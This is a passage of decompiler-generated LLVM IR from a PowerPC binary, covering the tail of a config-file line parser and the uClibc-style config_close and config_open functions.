  store i32 %v3_1000dd34, i32* %r3.global-to-local, align 4
  %v0_1000dd38 = load i32, i32* @r30, align 4
  %v1_1000dd38 = add i32 %v0_1000dd38, 8
  %v2_1000dd38 = inttoptr i32 %v1_1000dd38 to i32*
  %v3_1000dd38 = load i32, i32* %v2_1000dd38, align 4
  store i32 %v3_1000dd38, i32* %r0.global-to-local, align 4
  %v2_1000dd3c = add i32 %v0_1000dd38, 4
  %v3_1000dd3c = inttoptr i32 %v2_1000dd3c to i32*
  store i32 %v3_1000dd34, i32* %v3_1000dd3c, align 4
  %v1_1000dd40 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000dd40 = add i32 %v1_1000dd40, %v3_1000dd34
  store i32 %v2_1000dd40, i32* %r3.global-to-local, align 4
  %v1_1000dd44 = load i32, i32* @r30, align 4
  %v2_1000dd44 = add i32 %v1_1000dd44, 12
  %v3_1000dd44 = inttoptr i32 %v2_1000dd44 to i32*
  store i32 %v2_1000dd40, i32* %v3_1000dd44, align 4
  br label %dec_label_pc_1000dc94

dec_label_pc_1000dd4c:                            ; preds = %dec_label_pc_1000dd10, %dec_label_pc_1000dd90.dec_label_pc_1000dd4c_crit_edge
  %v0_1000dd4c = phi i32 [ %v0_1000dd4c.pre, %dec_label_pc_1000dd90.dec_label_pc_1000dd4c_crit_edge ], [ %v0_1000dd10, %dec_label_pc_1000dd10 ]
  %v1_1000dd4c = inttoptr i32 %v0_1000dd4c to i32*
  %v2_1000dd4c = load i32, i32* %v1_1000dd4c, align 4
  store i32 %v2_1000dd4c, i32* @r9, align 4
  %v1_1000dd50 = add i32 %v2_1000dd4c, 52
  %v2_1000dd50 = inttoptr i32 %v1_1000dd50 to i32*
  %v3_1000dd50 = load i32, i32* %v2_1000dd50, align 4
  store i32 %v3_1000dd50, i32* %r0.global-to-local, align 4
  %v3_1000dd54 = icmp eq i32 %v3_1000dd50, 0
  store i1 %v3_1000dd54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dd54, label %dec_label_pc_1000dd88, label %dec_label_pc_1000dd5c

dec_label_pc_1000dd5c:                            ; preds = %dec_label_pc_1000dd4c
  %v1_1000dd5c = add i32 %v2_1000dd4c, 16
  %v2_1000dd5c = inttoptr i32 %v1_1000dd5c to i32*
  %v3_1000dd5c = load i32, i32* %v2_1000dd5c, align 4
  store i32 %v3_1000dd5c, i32* %r3.global-to-local, align 4
  %v1_1000dd60 = add i32 %v2_1000dd4c, 24
  %v2_1000dd60 = inttoptr i32 %v1_1000dd60 to i32*
  %v3_1000dd60 = load i32, i32* %v2_1000dd60, align 4
  store i32 %v3_1000dd60, i32* %r0.global-to-local, align 4
  %v1_1000dd64 = add i32 %v3_1000dd5c, 1
  store i32 %v1_1000dd64, i32* @r11, align 4
  %v2_1000dd68 = icmp ult i32 %v3_1000dd5c, %v3_1000dd60
  %v4_1000dd68 = icmp eq i32 %v3_1000dd5c, %v3_1000dd60
  store i1 %v4_1000dd68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000dd68, label %dec_label_pc_1000dd70, label %dec_label_pc_1000dd7c

dec_label_pc_1000dd70:                            ; preds = %dec_label_pc_1000dd5c
  %v1_1000dd70 = inttoptr i32 %v3_1000dd5c to i8*
  %v2_1000dd70 = load i8, i8* %v1_1000dd70, align 1
  %v3_1000dd70 = zext i8 %v2_1000dd70 to i32
  store i32 %v3_1000dd70, i32* %r3.global-to-local, align 4
  store i32 %v1_1000dd64, i32* %v2_1000dd5c, align 4
  %v0_1000dd90.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000dd90

dec_label_pc_1000dd7c:                            ; preds = %dec_label_pc_1000dd5c
  store i32 %v2_1000dd4c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000dd84.559 to i32), i32* @lr, align 4
  %v0_1000dd80 = call i32 @getc_unlocked()
  store i32 %v0_1000dd80, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000dd90

dec_label_pc_1000dd88:                            ; preds = %dec_label_pc_1000dd4c
  store i32 %v2_1000dd4c, i32* %r3.global-to-local, align 4
  store i32 268492176, i32* @lr, align 4
  %v1_1000dd8c = call i32 @__GI_fgetc(i32 %v2_1000dd4c)
  store i32 %v1_1000dd8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000dd90

dec_label_pc_1000dd90:                            ; preds = %dec_label_pc_1000dd7c, %dec_label_pc_1000dd70, %dec_label_pc_1000dd88
  %v0_1000dd94 = phi i32 [ %v0_1000dd80, %dec_label_pc_1000dd7c ], [ %v0_1000dd90.pre, %dec_label_pc_1000dd70 ], [ %v1_1000dd8c, %dec_label_pc_1000dd88 ]
  %v3_1000dd90 = icmp eq i32 %v0_1000dd94, -1
  store i1 %v3_1000dd90, i1* %cr7_eq.global-to-local, align 1
  switch i32 %v0_1000dd94, label %dec_label_pc_1000dd90.dec_label_pc_1000dd4c_crit_edge [
    i32 -1, label %dec_label_pc_1000dda0
    i32 10, label %dec_label_pc_1000dda0
  ]

dec_label_pc_1000dd90.dec_label_pc_1000dd4c_crit_edge: ; preds = %dec_label_pc_1000dd90
  %v0_1000dd4c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000dd4c

dec_label_pc_1000dda0:                            ; preds = %dec_label_pc_1000dcec, %dec_label_pc_1000dd90, %dec_label_pc_1000dd90
  %v0_1000dda0 = load i32, i32* @r29, align 4
  %v3_1000dda0 = icmp eq i32 %v0_1000dda0, -1
  store i1 %v3_1000dda0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000dda0, label %dec_label_pc_1000ded8, label %dec_label_pc_1000dda8

dec_label_pc_1000dda8:                            ; preds = %dec_label_pc_1000dda0
  %v0_1000dda8 = load i32, i32* @r30, align 4
  %v1_1000dda8 = add i32 %v0_1000dda8, 12
  %v2_1000dda8 = inttoptr i32 %v1_1000dda8 to i32*
  %v3_1000dda8 = load i32, i32* %v2_1000dda8, align 4
  store i32 %v3_1000dda8, i32* @r31, align 4
  %v0_1000ddac = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000ddac, label %dec_label_pc_1000ddc0, label %dec_label_pc_1000ddb0

dec_label_pc_1000ddb0:                            ; preds = %dec_label_pc_1000dda8
  store i32 %v3_1000dda8, i32* @r3, align 4
  %v0_1000ddb4 = load i32, i32* @r27, align 4
  store i32 %v0_1000ddb4, i32* %r4.global-to-local, align 4
  %v2_1000ddb8 = inttoptr i32 %v3_1000dda8 to i8*
  %v3_1000ddb8 = call i32 @__GI_strspn(i8* %v2_1000ddb8, i32 %v0_1000ddb4)
  store i32 %v3_1000ddb8, i32* %r3.global-to-local, align 4
  %v0_1000ddbc = load i32, i32* @r31, align 4
  %v2_1000ddbc = add i32 %v0_1000ddbc, %v3_1000ddb8
  store i32 %v2_1000ddbc, i32* @r31, align 4
  br label %dec_label_pc_1000ddc0

dec_label_pc_1000ddc0:                            ; preds = %dec_label_pc_1000dda8, %dec_label_pc_1000ddb0
  %v0_1000ddc0 = phi i32 [ %v3_1000dda8, %dec_label_pc_1000dda8 ], [ %v2_1000ddbc, %dec_label_pc_1000ddb0 ]
  %v1_1000ddc0 = inttoptr i32 %v0_1000ddc0 to i8*
  %v2_1000ddc0 = load i8, i8* %v1_1000ddc0, align 1
  %v3_1000ddc4 = icmp eq i8 %v2_1000ddc0, 0
  store i1 %v3_1000ddc4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000ddc4, label %dec_label_pc_1000dc28, label %dec_label_pc_1000ddcc

dec_label_pc_1000ddcc:                            ; preds = %dec_label_pc_1000ddc0
  %v0_1000ddcc = load i32, i32* @r28, align 4
  %v1_1000ddcc = inttoptr i32 %v0_1000ddcc to i8*
  %v2_1000ddcc = load i8, i8* %v1_1000ddcc, align 1
  %v3_1000ddcc = zext i8 %v2_1000ddcc to i32
  store i32 %v3_1000ddcc, i32* %r0.global-to-local, align 4
  %v4_1000ddd0 = icmp eq i8 %v2_1000ddcc, %v2_1000ddc0
  store i1 %v4_1000ddd0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000ddd0, label %dec_label_pc_1000dc28, label %dec_label_pc_1000ddd8

dec_label_pc_1000ddd8:                            ; preds = %dec_label_pc_1000ddcc
  %v0_1000ddd8 = load i32, i32* @r30, align 4
  %v1_1000ddd8 = add i32 %v0_1000ddd8, 4
  %v2_1000ddd8 = inttoptr i32 %v1_1000ddd8 to i32*
  %v3_1000ddd8 = load i32, i32* %v2_1000ddd8, align 4
  store i32 %v3_1000ddd8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1000dde0 = load i32, i32* @r25, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000dde8 = load i32, i32* @r24, align 4
  %v2_1000dde8 = inttoptr i32 %v1_1000dde8 to i32*
  store i32 %v3_1000ddd8, i32* %v2_1000dde8, align 4
  store i32 ptrtoint (i32* @global_var_1000ddf0.560 to i32), i32* @lr, align 4
  %v3_1000ddec = call i32 @__GI_memset(i32 %v3_1000ddd8, i32 0, i32 %v0_1000dde0)
  store i32 %v3_1000ddec, i32* %r3.global-to-local, align 4
  %v0_1000dea82 = load i32, i32* @r31, align 4
  %v1_1000dea83 = inttoptr i32 %v0_1000dea82 to i8*
  %v2_1000dea84 = load i8, i8* %v1_1000dea83, align 1
  %v3_1000dea85 = zext i8 %v2_1000dea84 to i32
  store i32 %v3_1000dea85, i32* @r9, align 4
  %v3_1000deac7 = icmp eq i8 %v2_1000dea84, 0
  store i1 %v3_1000deac7, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000deac7, label %dec_label_pc_1000dec8, label %dec_label_pc_1000deb4

dec_label_pc_1000ddf4:                            ; preds = %dec_label_pc_1000dec0
  %v1_1000ddf4 = load i32, i32* @r23, align 4
  %v4_1000ddf4 = icmp eq i32 %v0_1000dec0, %v1_1000ddf4
  store i1 %v4_1000ddf4, i1* %cr7_eq.global-to-local, align 1
  %v0_1000ddf8 = load i32, i32* @r24, align 4
  %v1_1000ddf8 = inttoptr i32 %v0_1000ddf8 to i32*
  %v2_1000ddf8 = load i32, i32* %v1_1000ddf8, align 4
  %v1_1000ddfc = mul i32 %v0_1000dec0, 4
  store i32 %v1_1000ddfc, i32* %r0.global-to-local, align 4
  %v3_1000de00 = add i32 %v2_1000ddf8, %v1_1000ddfc
  %v4_1000de00 = inttoptr i32 %v3_1000de00 to i32*
  store i32 %v0_1000de00, i32* %v4_1000de00, align 4
  br i1 %v4_1000ddf4, label %dec_label_pc_1000de08, label %dec_label_pc_1000de0c

dec_label_pc_1000de08:                            ; preds = %dec_label_pc_1000ddf4
  %v0_1000de08 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_1000de08, label %dec_label_pc_1000de0c, label %dec_label_pc_1000de30

dec_label_pc_1000de0c:                            ; preds = %dec_label_pc_1000de08, %dec_label_pc_1000ddf4
  %v0_1000de0c = load i32, i32* @r28, align 4
  %v1_1000de0c = inttoptr i32 %v0_1000de0c to i8*
  %v2_1000de0c = load i8, i8* %v1_1000de0c, align 1
  %v3_1000de0c = zext i8 %v2_1000de0c to i32
  store i32 %v3_1000de0c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000de0c, i32* @r4, align 4
  %v3_1000de14 = icmp eq i8 %v2_1000de0c, 0
  store i1 %v3_1000de14, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000de14, label %dec_label_pc_1000de1c, label %dec_label_pc_1000de20

dec_label_pc_1000de1c:                            ; preds = %dec_label_pc_1000de0c
  %v0_1000de1c = load i32, i32* @r27, align 4
  store i32 %v0_1000de1c, i32* @r4, align 4
  br label %dec_label_pc_1000de20

dec_label_pc_1000de20:                            ; preds = %dec_label_pc_1000de0c, %dec_label_pc_1000de1c
  %v0_1000de20 = load i32, i32* @r31, align 4
  %v1_1000de20 = inttoptr i32 %v0_1000de20 to i8*
  store i32 %v0_1000de20, i32* %r3.global-to-local, align 4
  store i32 268492328, i32* @lr, align 4
  %v3_1000de24 = call i32 @strcspn(i8* %v1_1000de20)
  store i32 %v3_1000de24, i32* %r3.global-to-local, align 4
  %v0_1000de28 = load i32, i32* @r31, align 4
  %v2_1000de28 = add i32 %v0_1000de28, %v3_1000de24
  store i32 %v2_1000de28, i32* @r31, align 4
  br label %dec_label_pc_1000de60

dec_label_pc_1000de30:                            ; preds = %dec_label_pc_1000de08
  %v0_1000de30 = load i32, i32* @r28, align 4
  %v1_1000de30 = inttoptr i32 %v0_1000de30 to i8*
  %v2_1000de30 = load i8, i8* %v1_1000de30, align 1
  %v3_1000de30 = zext i8 %v2_1000de30 to i32
  store i32 %v3_1000de30, i32* %r4.global-to-local, align 4
  %v0_1000de34 = load i32, i32* @r31, align 4
  store i32 %v0_1000de34, i32* @r3, align 4
  store i32 268492348, i32* @lr, align 4
  %v4_1000de38 = call i32 @__GI_strchrnul(i32 %v0_1000de34, i32 %v3_1000de30, i32 %v2_1000ddf8)
  store i32 %v4_1000de38, i32* %r3.global-to-local, align 4
  store i32 %v4_1000de38, i32* @r31, align 4
  %v0_1000de40 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000de40, label %dec_label_pc_1000de60, label %dec_label_pc_1000de4c

dec_label_pc_1000de48:                            ; preds = %dec_label_pc_1000de4c
  %v1_1000de48 = add i32 %v0_1000de60.pre, -1
  store i32 %v1_1000de48, i32* @r31, align 4
  br label %dec_label_pc_1000de4c

dec_label_pc_1000de4c:                            ; preds = %dec_label_pc_1000de30, %dec_label_pc_1000de48
  %v0_1000de4c = phi i32 [ %v1_1000de48, %dec_label_pc_1000de48 ], [ %v4_1000de38, %dec_label_pc_1000de30 ]
  %v1_1000de4c = add i32 %v0_1000de4c, -1
  %v2_1000de4c = inttoptr i32 %v1_1000de4c to i8*
  %v3_1000de4c = load i8, i8* %v2_1000de4c, align 1
  %v4_1000de4c = zext i8 %v3_1000de4c to i32
  store i32 %v4_1000de4c, i32* %r4.global-to-local, align 4
  %v0_1000de50 = load i32, i32* @r27, align 4
  store i32 %v0_1000de50, i32* @r3, align 4
  store i32 268492376, i32* @lr, align 4
  %v2_1000de54 = call i32 @__GI_strchr(i32 %v0_1000de50, i32 %v4_1000de4c)
  store i32 %v2_1000de54, i32* %r3.global-to-local, align 4
  %v3_1000de58 = icmp eq i32 %v2_1000de54, 0
  store i1 %v3_1000de58, i1* %cr7_eq.global-to-local, align 1
  %v0_1000de60.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000de58, label %dec_label_pc_1000de60, label %dec_label_pc_1000de48

dec_label_pc_1000de60:                            ; preds = %dec_label_pc_1000de4c, %dec_label_pc_1000de30, %dec_label_pc_1000de20
  %v2_1000de74 = phi i32 [ %v4_1000de38, %dec_label_pc_1000de30 ], [ %v2_1000de28, %dec_label_pc_1000de20 ], [ %v0_1000de60.pre, %dec_label_pc_1000de4c ]
  %v1_1000de60 = inttoptr i32 %v2_1000de74 to i8*
  %v2_1000de60 = load i8, i8* %v1_1000de60, align 1
  %v0_1000de64 = load i32, i32* @r28, align 4
  %v1_1000de64 = inttoptr i32 %v0_1000de64 to i8*
  %v2_1000de64 = load i8, i8* %v1_1000de64, align 1
  %v3_1000de64 = zext i8 %v2_1000de64 to i32
  store i32 %v3_1000de64, i32* %r0.global-to-local, align 4
  %v4_1000de68 = icmp eq i8 %v2_1000de64, %v2_1000de60
  store i1 %v4_1000de68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000de68, label %dec_label_pc_1000de70, label %dec_label_pc_1000de7c

dec_label_pc_1000de70:                            ; preds = %dec_label_pc_1000de60
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v1_1000de60, align 1
  %v0_1000dea8.pre.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000de90

dec_label_pc_1000de7c:                            ; preds = %dec_label_pc_1000de60
  %v3_1000de7c = icmp eq i8 %v2_1000de60, 0
  store i1 %v3_1000de7c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000de7c, label %dec_label_pc_1000de90, label %dec_label_pc_1000de84

dec_label_pc_1000de84:                            ; preds = %dec_label_pc_1000de7c
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v1_1000de60, align 1
  %v0_1000de8c = load i32, i32* @r31, align 4
  %v1_1000de8c = add i32 %v0_1000de8c, 1
  store i32 %v1_1000de8c, i32* @r31, align 4
  br label %dec_label_pc_1000de90

dec_label_pc_1000de90:                            ; preds = %dec_label_pc_1000de7c, %dec_label_pc_1000de70, %dec_label_pc_1000de84
  %v0_1000dea8.pre = phi i32 [ %v2_1000de74, %dec_label_pc_1000de7c ], [ %v0_1000dea8.pre.pre, %dec_label_pc_1000de70 ], [ %v1_1000de8c, %dec_label_pc_1000de84 ]
  %v0_1000de90 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_1000de90, label %dec_label_pc_1000dea4, label %dec_label_pc_1000de94

dec_label_pc_1000de94:                            ; preds = %dec_label_pc_1000de90
  store i32 %v0_1000dea8.pre, i32* @r3, align 4
  %v0_1000de98 = load i32, i32* @r27, align 4
  store i32 %v0_1000de98, i32* %r4.global-to-local, align 4
  %v2_1000de9c = inttoptr i32 %v0_1000dea8.pre to i8*
  %v3_1000de9c = call i32 @__GI_strspn(i8* %v2_1000de9c, i32 %v0_1000de98)
  store i32 %v3_1000de9c, i32* %r3.global-to-local, align 4
  %v0_1000dea0 = load i32, i32* @r31, align 4
  %v2_1000dea0 = add i32 %v0_1000dea0, %v3_1000de9c
  store i32 %v2_1000dea0, i32* @r31, align 4
  br label %dec_label_pc_1000dea4

dec_label_pc_1000dea4:                            ; preds = %dec_label_pc_1000de90, %dec_label_pc_1000de94
  %v0_1000dea8 = phi i32 [ %v2_1000dea0, %dec_label_pc_1000de94 ], [ %v0_1000dea8.pre, %dec_label_pc_1000de90 ]
  %v0_1000dea4 = load i32, i32* @r29, align 4
  %v1_1000dea4 = add i32 %v0_1000dea4, 1
  store i32 %v1_1000dea4, i32* @r29, align 4
  %v1_1000dea8 = inttoptr i32 %v0_1000dea8 to i8*
  %v2_1000dea8 = load i8, i8* %v1_1000dea8, align 1
  %v3_1000dea8 = zext i8 %v2_1000dea8 to i32
  store i32 %v3_1000dea8, i32* @r9, align 4
  %v3_1000deac = icmp eq i8 %v2_1000dea8, 0
  store i1 %v3_1000deac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000deac, label %dec_label_pc_1000dec8, label %dec_label_pc_1000deb4

dec_label_pc_1000deb4:                            ; preds = %dec_label_pc_1000ddd8, %dec_label_pc_1000dea4
  %v0_1000de00 = phi i32 [ %v0_1000dea8, %dec_label_pc_1000dea4 ], [ %v0_1000dea82, %dec_label_pc_1000ddd8 ]
  %v1_1000deb8 = phi i32 [ %v3_1000dea8, %dec_label_pc_1000dea4 ], [ %v3_1000dea85, %dec_label_pc_1000ddd8 ]
  %v0_1000deb4 = load i32, i32* @r28, align 4
  %v1_1000deb4 = inttoptr i32 %v0_1000deb4 to i8*
  %v2_1000deb4 = load i8, i8* %v1_1000deb4, align 1
  %v3_1000deb4 = zext i8 %v2_1000deb4 to i32
  store i32 %v3_1000deb4, i32* %r0.global-to-local, align 4
  %v4_1000deb8 = icmp eq i32 %v3_1000deb4, %v1_1000deb8
  store i1 %v4_1000deb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000deb8, label %dec_label_pc_1000dec8, label %dec_label_pc_1000dec0

dec_label_pc_1000dec0:                            ; preds = %dec_label_pc_1000deb4
  %v0_1000dec0 = load i32, i32* @r29, align 4
  %v1_1000dec0 = load i32, i32* @r26, align 4
  %v2_1000dec0 = icmp slt i32 %v0_1000dec0, %v1_1000dec0
  %v4_1000dec0 = icmp eq i32 %v0_1000dec0, %v1_1000dec0
  store i1 %v4_1000dec0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000dec0, label %dec_label_pc_1000ddf4, label %dec_label_pc_1000dec8

dec_label_pc_1000dec8:                            ; preds = %dec_label_pc_1000dea4, %dec_label_pc_1000deb4, %dec_label_pc_1000dec0, %dec_label_pc_1000ddd8
  %v0_1000dec8 = load i32, i32* @r29, align 4
  %v2_1000dec8 = icmp slt i32 %v0_1000dec8, %v1_1000dc18
  %v4_1000dec8 = icmp eq i32 %v0_1000dec8, %v1_1000dc18
  store i1 %v4_1000dec8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000dec8, label %dec_label_pc_1000ded0, label %dec_label_pc_1000dedc

dec_label_pc_1000ded0:                            ; preds = %dec_label_pc_1000dec8
  %v1_1000ded0 = call %0 @__asm_mtcrf(i32 128, i32 %v0_1000dc10)
  %v4_1000ded0 = extractvalue %0 %v1_1000ded0, 2
  br i1 %v4_1000ded0, label %dec_label_pc_1000dc28, label %dec_label_pc_1000ded8

dec_label_pc_1000ded8:                            ; preds = %dec_label_pc_1000ded0, %dec_label_pc_1000dc58, %dec_label_pc_1000dda0, %entry, %dec_label_pc_1000dcbc
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000dedc

dec_label_pc_1000dedc:                            ; preds = %dec_label_pc_1000dec8, %dec_label_pc_1000ded8
  %v0_1000dee0 = phi i32 [ 0, %dec_label_pc_1000ded8 ], [ %v0_1000dec8, %dec_label_pc_1000dec8 ]
  store i32 %v0_1000dbd0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000dee0, i32* %r3.global-to-local, align 4
  %v1_1000def0 = call %0 @__asm_mtcrf(i32 56, i32 %v0_1000dbcc)
  ret i32 %v0_1000dee0

; uselistorder directives
  uselistorder i32 %v0_1000dee0, { 1, 0 }
  uselistorder i32 %v0_1000dec0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000dea8.pre, { 2, 0, 1 }
  uselistorder i1 %v3_1000de7c, { 1, 0 }
  uselistorder i8* %v1_1000de60, { 1, 0, 2 }
  uselistorder i32 %v4_1000de38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000de20, { 1, 0 }
  uselistorder i32 %v1_1000ddfc, { 1, 0 }
  uselistorder i32 %v2_1000ddf8, { 1, 0 }
  uselistorder i1 %v4_1000ddd0, { 1, 0 }
  uselistorder i32 %v3_1000dda8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000dd60, { 1, 0, 2 }
  uselistorder i32 %v3_1000dd5c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_1000dd4c, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32 %v0_1000dd10, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_1000dcf8, { 1, 0 }
  uselistorder i32 %v1_1000dcf4, { 1, 0 }
  uselistorder i8* %v3_1000dce0, { 1, 0 }
  uselistorder i32 %v2_1000dce0, { 0, 2, 1 }
  uselistorder i32 %v3_1000dcac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000dca0, { 1, 0 }
  uselistorder i32 %v1_1000dc90, { 0, 2, 1 }
  uselistorder i32 %v0_1000dc58, { 1, 0 }
  uselistorder i32 %v1_1000dc18, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 10, 11, 12, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 12, 3, 5, 23, 6, 24, 7, 8, 25, 4, 26, 27, 28, 29, 19, 13, 20, 21, 14, 15, 22, 16, 17, 9, 18, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 3, 20, 21, 23, 24, 25, 26, 27, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 15, 16, 17, 1, 2, 3, 13, 14, 4, 18, 19, 20, 21, 22, 23, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 50, 51, 48, 47, 52, 49, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 (i32*, i32)* @realloc, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 92, { 4, 3, 0, 1, 2 }
  uselistorder i32 (i8*)* @__GI_strlen, { 1, 0 }
  uselistorder i32 81, { 0, 2, 1 }
  uselistorder i32 14, { 30, 32, 31, 6, 7, 0, 8, 9, 1, 10, 11, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 4, 25, 26, 27, 28, 29, 5 }
  uselistorder i32 1048576, { 3, 0, 2, 1 }
  uselistorder i32 %arg3, { 1, 2, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_1000dedc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ded8, { 0, 2, 4, 1, 3 }
  uselistorder label %dec_label_pc_1000dec8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000deb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000dea4, { 1, 0 }
  uselistorder label %dec_label_pc_1000de90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000de4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000de20, { 1, 0 }
  uselistorder label %dec_label_pc_1000ddc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000dda0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000dd90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000dd4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000dc80, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc58, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc48, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %v0_1000df04 = load i32, i32* @r31, align 4
  %v3_1000df08 = icmp eq i32* %arg1, null
  br i1 %v3_1000df08, label %dec_label_pc_1000df38, label %dec_label_pc_1000df14

dec_label_pc_1000df14:                            ; preds = %entry
  %v2_1000df14 = load i32, i32* %arg1, align 4
  store i32 268492572, i32* @lr, align 4
  %v1_1000df18 = inttoptr i32 %v2_1000df14 to i16*
  %v2_1000df18 = call i32 @__GI_fclose(i16* %v1_1000df18)
  %v0_1000df1c = load i32, i32* @r31, align 4
  %v1_1000df1c = add i32 %v0_1000df1c, 20
  %v2_1000df1c = inttoptr i32 %v1_1000df1c to i32*
  %v3_1000df1c = load i32, i32* %v2_1000df1c, align 4
  %v3_1000df20 = icmp eq i32 %v3_1000df1c, 0
  br i1 %v3_1000df20, label %dec_label_pc_1000df30, label %dec_label_pc_1000df28

dec_label_pc_1000df28:                            ; preds = %dec_label_pc_1000df14
  %v1_1000df28 = add i32 %v0_1000df1c, 4
  %v2_1000df28 = inttoptr i32 %v1_1000df28 to i32*
  %v3_1000df28 = load i32, i32* %v2_1000df28, align 4
  store i32 %v3_1000df28, i32* @r3, align 4
  store i32 268492592, i32* @lr, align 4
  %v0_1000df2c = call i32 @free()
  %v0_1000df30.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000df30

dec_label_pc_1000df30:                            ; preds = %dec_label_pc_1000df14, %dec_label_pc_1000df28
  %v0_1000df30 = phi i32 [ %v0_1000df1c, %dec_label_pc_1000df14 ], [ %v0_1000df30.pre, %dec_label_pc_1000df28 ]
  store i32 %v0_1000df30, i32* @r3, align 4
  store i32 268492600, i32* @lr, align 4
  %v0_1000df34 = call i32 @free()
  br label %dec_label_pc_1000df38

dec_label_pc_1000df38:                            ; preds = %entry, %dec_label_pc_1000df30
  %v0_1000df48 = phi i32 [ 0, %entry ], [ %v0_1000df34, %dec_label_pc_1000df30 ]
  store i32 %v0_1000df04, i32* @r31, align 4
  ret i32 %v0_1000df48

; uselistorder directives
  uselistorder label %dec_label_pc_1000df38, { 1, 0 }
  uselistorder label %dec_label_pc_1000df30, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %v0_1000df5c = load i32, i32* @r31, align 4
  store i32 268492648, i32* @lr, align 4
  %v1_1000df64 = call i32 @__GI_fopen(i32 ptrtoint (i32* @global_var_10010c1c.561 to i32))
  %v3_1000df68 = icmp eq i32 %v1_1000df64, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1000df68, label %dec_label_pc_1000df8c, label %dec_label_pc_1000df74

dec_label_pc_1000df74:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268492672, i32* @lr, align 4
  %v2_1000df7c = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_1000df7c, i32* %r3.global-to-local, align 4
  %v3_1000df80 = icmp eq i32 %v2_1000df7c, 0
  br i1 %v3_1000df80, label %dec_label_pc_1000df8c, label %dec_label_pc_1000df88

dec_label_pc_1000df88:                            ; preds = %dec_label_pc_1000df74
  %v0_1000df88 = load i32, i32* @r31, align 4
  %v2_1000df88 = inttoptr i32 %v2_1000df7c to i32*
  store i32 %v0_1000df88, i32* %v2_1000df88, align 4
  %v0_1000df9c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000df8c

dec_label_pc_1000df8c:                            ; preds = %dec_label_pc_1000df74, %entry, %dec_label_pc_1000df88
  %v0_1000df9c = phi i32 [ 0, %dec_label_pc_1000df74 ], [ 0, %entry ], [ %v0_1000df9c.pre, %dec_label_pc_1000df88 ]
  store i32 %v0_1000df5c, i32* @r31, align 4
